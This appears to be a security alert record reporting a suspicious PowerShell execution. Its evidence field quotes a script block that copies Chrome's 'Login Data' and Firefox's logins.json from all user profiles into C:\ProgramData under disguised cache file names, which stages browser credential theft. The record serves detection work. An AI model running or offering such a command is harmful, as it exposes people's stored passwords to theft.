description: A suspicious PowerShell script was executed on the host.

evidence.scriptblock: Copy-Item 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data' -Destination C:\ProgramData\chrome_cache.db -Force; Copy-Item 'C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json' -Destination C:\ProgramData\ff_cache.json -Force
